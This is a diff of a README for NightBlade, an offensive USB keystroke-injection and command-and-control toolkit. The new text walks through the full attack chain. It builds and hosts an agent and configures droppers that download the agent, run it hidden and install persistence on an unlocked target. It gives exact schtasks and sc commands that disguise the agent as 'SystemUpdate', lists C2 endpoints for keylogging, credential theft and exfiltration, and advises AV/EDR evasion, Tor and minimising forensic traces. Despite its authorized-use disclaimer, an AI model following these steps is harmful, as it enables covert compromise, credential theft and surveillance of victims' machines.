@@ -34,397 +34,348 @@
 [![Status](https://img.shields.io/badge/status-Production-green.svg)](https://github.com/darksec/nightblade)
 
 ---
+==================================================================================
+                            🗡️ NIGHTBLADE v2.0
+                 DarkSec Labs - USBArmyKnife Command Center
+==================================================================================
 
 ## 🗡️ Overview
 
-**DarkSec NIGHTBLADE** is an advanced USB Army Knife flasher and exploitation framework designed for professional penetration testers and red team operators. Combining enterprise-grade command & control infrastructure with sophisticated attack capabilities, NIGHTBLADE represents the cutting edge of USB-based offensive security tools.
+A command-center for USB HID operations, payload crafting, wireless attack 
+tooling, and a security‑hardened C2—designed to pair with USB Army Knife 
+(LILYGO T‑Dongle S3) and other devices.
 
---IMPORTANT!-- I have only tested this on the Lilygo T-Dongle ESP32 S3.
+Core Idea
+---------
+NightBlade is your cockpit: build DuckyScripts, flash devices, deploy agents 
+via HID droppers, and orchestrate targets through the integrated C2. Use the 
+device's AP/WebUI (4.3.2.1:8080) to upload autorun DuckyScripts; the runtime 
+agent then talks to NightBlade C2 over your chosen network path (direct or ngrok).
 
-### Key Features
+Highlights
+----------
+- Full GUI (installer_gui.py) + compact UI (smallgui.py) for small screens
+- DuckyScript editor, syntax highlighting, linter, payload library
+- WiFi/Bluetooth attack panels (scan, quick actions)
+- Obfuscation and social‑engineering helpers
+- Profiles, Serial monitor, eFuse tools, Dashboard analytics
+- Security‑hardened C2 (Flask + WebSocket) with API keys, rate limiting, audit logging
+- Cross‑platform agent (Linux/macOS/Windows) + ready‑made HID droppers
+- Windows persistence: HKCU/Task/Service
+- Linux/macOS persistence: systemd/LaunchAgent
 
-#### Core C2 Infrastructure
-- 🎯 **Enterprise-Grade C2 Server** - 30+ API endpoints with SQLite persistence
-- 🔒 **SSL/TLS Encryption** - HTTPS support with auto-generated certificates
-- 🌐 **Ngrok Integration** - Public tunnel access with authentication
-- ⚡ **WebSocket Real-time Shell** - Bidirectional instant command execution
-- 🔐 **Multi-User Support** - Role-based access control (admin/operator)
-- 📊 **Command History Tracking** - Full audit trail with operator attribution
-- 🏷️ **Beacon Tagging System** - Organize targets by campaign/group
-- 💚 **Health Monitoring** - Automatic beacon health status tracking
-- 🤖 **Auto-Tasking** - Execute commands on beacon registration
-- 📤 **Data Export** - CSV/JSON exports for reports
-- 🧩 **Plugin System** - Extensible custom functionality
-- 🔐 **Encrypted Exfiltration** - Fernet encryption + gzip compression
+What NightBlade Is/Is Not
+--------------------------
+✓ Is: a controller and toolkit for authorized security testing and research
+✗ Is Not: a magical "USB autorun" bypass—modern Windows disables USB AutoRun; 
+  delivery is via HID keystrokes (DuckyScript) while the session is unlocked
 
-#### Attack Capabilities
-- 📸 **Screenshot Capture** - Visual reconnaissance with organized storage
-- ⌨️ **Keylogger Integration** - Real-time keystroke capture and window tracking
-- 🔑 **Credential Harvesting** - Automated collection from browsers, memory, and files
-- 🖥️ **Process Management** - List, kill, and start processes remotely
-- 📁 **File Operations** - Complete file browser with upload/download/execute
-- 🔄 **Persistence Management** - Multiple methods including registry, tasks, services
-- 🌐 **Network Reconnaissance** - Scanning, port enumeration, ARP/DNS discovery
-- ⏰ **Task Scheduling** - Time-based automated operations
-- 🔗 **Multi-Beacon Control** - Bulk operations across multiple targets
+==================================================================================
+## 🚀 Quick Start (Local Dev)
+==================================================================================
 
-#### Development Tools
-- 🎨 **DuckyScript Editor** - Advanced payload development environment
-- 📚 **Payload Library** - Pre-built attack modules for various scenarios
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
+1. Install Dependencies
+-----------------------
 
 ```bash
-# Install Python dependencies
-pip install -r requirements.txt
+# Clone repo (if not already)
+git clone https://github.com/wickednull/DarkBlade.git
+cd DarkBlade
 
-# Or manually:
-pip install ttkbootstrap pyserial requests flask flask-sock pyngrok cryptography
-
-# Install ESP-IDF tools (for firmware flashing)
-# Follow: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/
-```
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/wickednull/nightblade.git
-cd nightblade
-
+# Create virtual environment
 python3 -m venv venv
+source venv/bin/activate  # Linux/macOS
+# venv\Scripts\activate   # Windows
 
-source venv/bin/activate
-
+# Install requirements
 pip install -r requirements.txt
-
-# Run the installer
-python installer_gui.py
-
-# For smaller screens i.e HackberryPi/Uconsole
-
-python smallgui.py
 ```
 
-### Basic Usage
-
-1. **Connect your USB Army Knife device** (ESP32-based)
-2. **Launch NIGHTBLADE**: `python installer_gui.py`
-3. **Flash firmware**: Navigate to ⚡ Flasher tab → Install Firmware
-4. **Create payloads**: Use 📝 DuckyScript Editor
-5. **Start C2 server**: Go to 🕸️ C2 Server → Start Server
-6. **Deploy and monitor**: Track beacons and execute commands
-
----
-
-## 📚 Documentation
-
-### Core Modules
-
-#### 🕸️ C2 Server - Elite Edition
-Enterprise-grade command and control with 12 advanced features:
-
-**Core Features:**
-- SQLite database backend (15+ tables)
-- Multi-user support with role-based permissions
-- API authentication with SHA256 hashed keys
-- Command history with operator tracking
-- Beacon health monitoring (healthy/warning/dead)
-- Auto-tasking on beacon registration
-
-**Advanced Capabilities:**
-- SSL/TLS encryption (HTTPS)
-- Ngrok integration for public access
-- WebSocket real-time shell
-- File compression/encryption (Fernet + gzip)
-- Beacon grouping/tagging system
-- Data export (CSV/JSON)
-- Extensible plugin system
-
-
-
-#### 📝 DuckyScript Editor
-Advanced payload development with:
-- Syntax highlighting
-- Variable support
-- Multiple keyboard layouts
-- Payload templates
-- Direct device deployment
-
-#### 📦 Payload Library
-Pre-built exploits categorized by:
-- Information Gathering
-- Persistence
-- Exfiltration
-- Credential Harvesting
-- Network Operations
-- Social Engineering
-
-#### ⚡ Firmware Flasher
-ESP32 device management:
-- Auto-detect devices
-- One-click firmware installation
-- Filesystem upload
-- eFuse management
-- Serial monitor
-
----
-
-## 🎯 Advanced Features
-
-### C2 Server Capabilities - Elite Edition
-
-```python
-# API Endpoints (30+)
-# Beacon Management
-/api/beacon/register          # Beacon registration with auto-tasks
-/api/beacon/checkin/<id>      # Command check-in
-/api/beacon/<id>/command      # Send command with operator tracking
-/api/beacon/<id>/history      # Command history viewer
-/api/beacon/<id>/tags         # Tag management
-/api/beacons                  # List beacons with filtering (group/tags)
-/api/beacons/bulk/command     # Bulk operations
-
-# Data Collection
-/api/beacon/<id>/screenshot   # Screenshot upload (encrypted)
-/api/beacon/<id>/keylog       # Keylogger data
-/api/beacon/<id>/credentials  # Credential harvesting
-/api/beacon/<id>/exfil        # Encrypted data exfiltration
-
-# Operations
-/api/beacon/<id>/processes    # Process management
-/api/beacon/<id>/files        # File operations
-/api/beacon/<id>/persistence  # Persistence management
-/api/beacon/<id>/network      # Network operations
-/api/beacon/<id>/sysinfo      # System information
-
-# Advanced Features
-/api/auto-tasks               # Auto-task management (GET/POST)
-/api/export/<type>            # Data export (CSV/JSON)
-/api/users/create             # Multi-user management
-/api/plugins                  # Plugin system
-/api/plugins/<name>           # Execute plugin
-/api/credentials              # View all credentials
-
-# Real-time
-/ws/shell/<beacon_id>         # WebSocket real-time shell
-```
-
-### Example Beacon Payload
-
-```python
-# Advanced beacon with all features
-python advanced_beacon.py --server http://c2.example.com:8443
-```
-
-Features:
-- Auto-registration
-- Command execution
-- Screenshot capture
-- Keylogging
-- Credential dumping
-- Persistence installation
-- Network reconnaissance
-
----
-
-## 🛠️ Architecture
-
-### System Components
-
-```
-DarkSec NIGHTBLADE
-├── installer_gui.py           # Main GUI application
-├── c2_server.py              # C2 server (standard edition)
-├── c2_server_enhanced.py     # C2 server (elite edition - 12 features)
-├── duckyscript_converter.py  # DuckyScript compiler
-├── payloads/                 # Payload library
-│   ├── info_gathering/
-│   ├── persistence/
-│   ├── exfiltration/
-│   └── credential_harvest/
-├── firmware/                 # ESP32 firmware binaries
-└── encryption_key.bin        # C2 encryption key (auto-generated)
-```
-
-### Database Schema
-
-```sql
--- 15+ persistent tables for complete operation tracking
-beacons           # Beacon tracking with tags, groups, health status
-commands          # Command queue with operator attribution
-exfil_data        # Encrypted/compressed exfiltrated data
-screenshots       # Captured screenshots
-keylogs           # Keystroke recordings
-credentials       # Harvested credentials by source
-sessions          # Interactive WebSocket shell sessions
-tasks             # Scheduled operations
-auto_tasks        # NEW: Auto-tasks on beacon registration
-api_keys          # Authentication with roles & permissions
-files             # File browser cache
-beacon_groups     # NEW: Beacon grouping system
-listener_profiles # NEW: Multiple listener configurations
-audit_log         # NEW: Complete operation audit trail
-```
-
----
-
-## 🎨 GUI Overview
-
-### Tabs
-
-1. **🏠 Welcome** - Quick setup and project initialization
-2. **⚡ Flasher** - Device firmware management
-3. **🔧 eFuse** - ESP32 configuration
-4. **🤖 Agent** - Autonomous operation modes
-5. **📝 DuckyScript** - Payload editor
-6. **📚 Library** - Pre-built payloads
-7. **📟 Serial Monitor** - Device communication
-8. **👤 Profiles** - Device configurations
-9. **🎭 Orchestration** - Multi-stage attacks
-10. **🕸️ C2 Server** - Command & control
-11. **📡 WiFi Attacks** - Wireless exploitation
-12. **📶 Bluetooth** - BLE attacks
-13. **🎭 Obfuscation** - Payload protection
-14. **🎣 Social Engineering** - Pretexting tools
-15. **🌐 Network Recon** - Discovery tools
-16. **💀 Post-Exploit** - Advanced techniques
-17. **📊 Dashboard** - Operations overview
-
----
-
-## 🔒 Security Considerations
-
-### Operational Security
-
-- ✅ Use VPNs/proxies for C2 communications
-- ✅ Enable API key authentication
-- ✅ Encrypt exfiltrated data
-- ✅ Use domain fronting when possible
-- ✅ Implement beacon jitter
-- ✅ Rotate credentials regularly
-
-### OPSEC Features
-
-- Encrypted C2 communications
-- API key authentication
-- Audit logging
-- Beacon fingerprint randomization
-- Anti-forensics capabilities
-- Secure data deletion
-
----
-
-## 🎓 Use Cases
-
-### Authorized Penetration Testing
-- Red team engagements
-- Physical security assessments
-- Social engineering testing
-- Insider threat simulation
-
-### Security Research
-- Exploit development
-- Detection capability testing
-- Blue team training
-- Attack simulation
-
-### Defensive Security
-- Detection rule development
-- SOC analyst training
-- Incident response drills
-- EDR/AV testing
-
----
-
-## 📊 Technical Specifications
-
-### Elite Edition C2 Server
-
-| Component | Specification |
-|-----------|---------------|
-| **API Endpoints** | 30+ RESTful + WebSocket |
-| **Database** | SQLite with 15+ persistent tables |
-| **SSL/TLS** | ✅ Auto-generated certificates |
-| **Ngrok Integration** | ✅ Public tunnel with auth |
-| **WebSocket Shell** | ✅ Real-time bidirectional |
-| **Encryption** | ✅ Fernet + gzip for exfil |
-| **Multi-User** | ✅ Role-based access control |
-| **Health Monitoring** | ✅ Automated status tracking |
-| **Auto-Tasking** | ✅ On registration triggers |
-| **Data Export** | ✅ CSV/JSON/HTML reports |
-| **Plugin System** | ✅ Extensible architecture |
-| **Command History** | ✅ Full audit with operators |
-| **Beacon Tagging** | ✅ Campaign organization |
-
-### Attack Capabilities
-
-| Feature | Status |
-|---------|--------|
-| **Screenshot System** | ✅ Full capture & encrypted storage |
-| **Keylogger** | ✅ Real-time with window tracking |
-| **Credential Storage** | ✅ Organized harvesting database |
-| **Persistence** | ✅ Automated multi-method |
-| **Network Operations** | ✅ Advanced reconnaissance |
-| **Multi-Beacon Control** | ✅ Bulk operations support |
-| **Authentication** | SHA256 API key + permissions |
-| **Platform Support** | Windows, Linux, macOS |
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
+2. Launch GUI
+-------------
 
 ```bash
-git clone https://github.com/darksec/nightblade.git
-cd nightblade
-pip install -r requirements.txt
-python installer_gui.py
+# Full GUI
+python3 installer_gui.py
+
+# Compact GUI (for small screens)
+python3 smallgui.py
 ```
 
----
+3. Start C2 Server
+------------------
 
-## 📄 License
+```bash
+# Via GUI: navigate to C2 tab and click "Start C2"
 
-This project is licensed under a custom license. See [LICENSE](LICENSE) for details.
+# Or via CLI:
+venv/bin/python c2_server/c2_server.py --port 8443
 
----
-
-## ⚠️ Legal Disclaimer
-
-```
-╔═══════════════════════════════════════════════════════════════╗
-║                      ⚠️  LEGAL NOTICE                         ║
-║                                                               ║
-║  DarkSec NIGHTBLADE is designed exclusively for authorized   ║
-║  security testing, penetration testing, and red team         ║
-║  operations. Unauthorized access to computer systems is      ║
-║  illegal.                                                     ║
-║                                                               ║
-║  Users must obtain proper authorization before deployment.   ║
-║  DarkSec Labs and the developers assume no liability for     ║
-║  misuse of this software.                                    ║
-║                                                               ║
-║  By using this tool, you agree to comply with all            ║
-║  applicable laws and regulations.                            ║
-╚═══════════════════════════════════════════════════════════════╝
+# Optional: enable ngrok for public access
+# (configure in GUI C2 tab or pass --ngrok flag)
 ```
 
----
+4. Validate C2
+--------------
 
+- Note the "Master API Key" displayed in GUI C2 tab
+- Click "Refresh Beacons" (should be empty initially)
+- C2 is ready when "Server Status: Running" shows
 
----
+==================================================================================
+## 🤖 Agent Workflow (Recommended)
+==================================================================================
 
+Step 1: Build Agent
+-------------------
+
+```bash
+# Linux/macOS
+pyinstaller -F -n db-agent agents/db_agent.py
+
+# Windows (run on Windows build box)
+pyinstaller -F -n db-agent.exe agents\db_agent.py
+```
+
+Binaries output to: dist/db-agent (or dist/db-agent.exe)
+
+Step 2: Host Binary
+-------------------
+
+```bash
+# Example: simple HTTP server
+cd dist
+python3 -m http.server 8000
+
+# Or upload to your CDN/server
+# Note the AGENT_URL, e.g.: http://192.168.1.100:8000/db-agent
+```
+
+Step 3: Generate HID Dropper Payload
+-------------------------------------
+
+1. Open GUI → Payload Library
+2. Select dropper template:
+   - Windows_Agent_Dropper.json (HKCU Run)
+   - Windows_Agent_Dropper_Task.json (Scheduled Task)
+   - Linux_Agent_Dropper.json (systemd user service)
+   - MacOS_Agent_Dropper.json (LaunchAgent)
+
+3. Fill variables:
+   - AGENT_URL: http://YOUR_SERVER:8000/db-agent
+   - C2_URL: http://YOUR_IP:8443 (or ngrok URL)
+   - JITTER: 30 (seconds)
+   - SLEEP: 60 (seconds)
+   - PROXY: (optional, e.g., http://proxy:8080)
+
+4. Save as autorun.ds
+
+Step 4: Deliver via USB Army Knife
+-----------------------------------
+
+```bash
+# Option A: Upload via device AP/WebUI
+# 1. Connect to device AP (SSID: USBArmy...)
+# 2. Navigate to http://4.3.2.1:8080
+# 3. Upload autorun.ds
+
+# Option B: Copy to SD card
+# Mount SD card and copy autorun.ds to root
+```
+
+Plug device into unlocked target → dropper runs → agent beacons
+
+Step 5: Verify Beacon
+----------------------
+
+1. GUI → C2 tab → Refresh Beacons
+2. Select beacon → Send command: whoami
+3. View result in output panel
+
+==================================================================================
+## 🔐 Persistence Options
+==================================================================================
+
+Windows
+-------
+
+HKCU Run (No Elevation)
+```
+Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Trigger: User logon
+Privileges: User
+```
+
+User Scheduled Task (No Elevation)
+```
+Command: schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONLOGON /rl LIMITED
+Trigger: User logon
+Privileges: User
+```
+
+SYSTEM Scheduled Task (Requires UAC)
+```
+Command: schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST
+Trigger: Boot
+Privileges: SYSTEM
+```
+
+Windows Service (Requires UAC)
+```
+Command: sc create "SystemUpdate" binPath= "C:\path\db-agent.exe" start= auto
+Trigger: Boot
+Privileges: SYSTEM
+```
+
+Linux
+-----
+
+```bash
+# Install systemd user service
+chmod +x agents/linux/install.sh
+./agents/linux/install.sh /path/to/db-agent http://C2_IP:8443
+
+# Service runs at user login
+systemctl --user status db-agent
+```
+
+macOS
+-----
+
+```bash
+# Install LaunchAgent
+chmod +x agents/macos/install_mac.sh
+./agents/macos/install_mac.sh /path/to/db-agent http://C2_IP:8443
+
+# Agent runs at user login
+launchctl list | grep darkblade
+```
+
+==================================================================================
+## 🔧 USB Army Knife Integration
+==================================================================================
+
+Device AP/WebUI: 4.3.2.1:8080
+- For uploading/managing DuckyScripts
+- NOT the beacon communication path
+
+Workflow:
+1. DuckyScript dropper (autorun.ds) executes on device plug-in
+2. Opens shell (Win+R/Terminal)
+3. Downloads agent from AGENT_URL
+4. Jitters (random delay)
+5. Runs agent hidden
+6. Configures persistence
+7. Agent beacons to C2_URL over LAN/WAN/ngrok
+
+==================================================================================
+## 🛡️ Security & Legal
+==================================================================================
+
+⚠️  LEGAL NOTICE
+----------------
+DarkSec NIGHTBLADE is designed exclusively for authorized security testing, 
+penetration testing, and red team operations. Unauthorized access to computer 
+systems is illegal.
+
+- Obtain proper authorization before deployment
+- DarkSec Labs assumes no liability for misuse
+- Comply with all applicable laws and regulations
+
+OPSEC Considerations:
+- Use jitter and variable sleep intervals
+- Route traffic through proxies/Tor if needed
+- Rotate API keys regularly
+- Use ngrok or reverse proxies for obfuscation
+- Minimize forensic artifacts (userland persistence preferred)
+- Expect AV/EDR scrutiny; obfuscate/encrypt payloads as needed
+
+==================================================================================
+## 🔍 Troubleshooting
+==================================================================================
+
+No Beacon Appears
+-----------------
+- Verify C2_URL is reachable from target
+- Check firewall/EDR blocking outbound connections
+- Confirm AGENT_URL is correct and binary downloads
+- For elevated droppers: ensure UAC prompt was accepted
+- Check c2_server/audit.log for connection attempts
+
+Windows PowerShell Blocked
+---------------------------
+- Use Signed-PS dropper template with code-signed PS1 installer
+- Or switch to cmd.exe based dropper
+
+Linux/macOS Agent Runs But No Beacon
+-------------------------------------
+- Check DB_PROXY environment variable
+- Test egress: curl -v http://C2_IP:8443
+- Review systemd/LaunchAgent logs
+
+GUI Scroll Issues
+-----------------
+- Use smallgui.py for small screens
+- Most panels support mousewheel/two-finger scroll
+
+Payload JSON Errors
+-------------------
+- Ensure scripts are valid JSON with proper escaping
+- Recent repo fixes address most JSON issues
+
+==================================================================================
+## 📂 Files of Interest
+==================================================================================
+
+installer_gui.py                        - Main GUI
+smallgui.py                             - Compact small-screen GUI
+agents/db_agent.py                      - Cross-platform agent (Python)
+agents/linux/*                          - systemd user service + installer
+agents/macos/*                          - LaunchAgent plist + installer
+payloads/*Agent_Dropper*.json           - HID droppers with jitter/proxy/persistence
+c2_server/c2_server.py                  - C2 server (Flask + WebSocket)
+
+==================================================================================
+## 💡 Operational Tips
+==================================================================================
+
+```bash
+# Use ngrok for quick external C2 access
+./ngrok http 8443
+# Copy public URL to C2_URL variable
+
+# Tune SLEEP/JITTER per engagement
+# 60/30 is reasonable default (60s sleep, ±30s jitter)
+
+# Windows persistence preference:
+# 1. HKCU Run (quietest)
+# 2. User Task (if registry monitored)
+# 3. SYSTEM Task/Service (if elevation available)
+
+# Test agent manually before HID deployment:
+python3 agents/db_agent.py
+# Or on Windows:
+db-agent.exe
+
+# Build optimized binary:
+pyinstaller -F --onefile --windowed -n db-agent agents/db_agent.py
+```
+
+==================================================================================
+## 🗺️ Roadmap
+==================================================================================
+
+- One-click "Build & Self-Test" in Agent tab
+- PyInstaller integration + local run + beacon validation
+- Expanded device support beyond USB Army Knife
+- Optional encrypted transport (TLS/mTLS)
+- Domain fronting presets for CDN-based C2
+
+==================================================================================
 ## 🙏 Credits
+==================================================================================
 
-**Developed by DarkSec Labs**
+Developed by DarkSec Labs
 
 Special thanks to:
 - The ESP32 community
@@ -432,16 +383,28 @@ Special thanks to:
 - Open source security researchers
 - Red team operators worldwide
 
----
+==================================================================================
+
+╔═══════════════════════════════════════════════════════════════╗
+║                    ⚠️ LEGAL DISCLAIMER!!                      ║
+║                                                               ║
+║  DarkSec NIGHTBLADE is designed exclusively for authorized    ║
+║  security testing, penetration testing, and red team          ║
+║  operations. Unauthorized access to computer systems is       ║
+║  illegal.                                                     ║
+║                                                               ║
+║  Users must obtain proper authorization before deployment.    ║
+║  DarkSec Labs and the developers assume no liability for      ║
+║  misuse of this software.                                     ║
+║                                                               ║
+║  By using this tool, you agree to comply with all             ║
+║  applicable laws and regulations.                             ║
+╚═══════════════════════════════════════════════════════════════╝
+
+==================================================================================
+                         DarkSec NIGHTBLADE v2.0
+              From DarkSec Labs - Forging the future of offensive security
+                  ⚔️ The blade that cuts through digital darkness ⚔️
+==================================================================================
 
 
----
-
-<div align="center">
-
-**DarkSec NIGHTBLADE v2.0**  
-*From DarkSec Labs - Forging the future of offensive security*
-
-⚔️ **The blade that cuts through digital darkness** ⚔️
-
-</div>
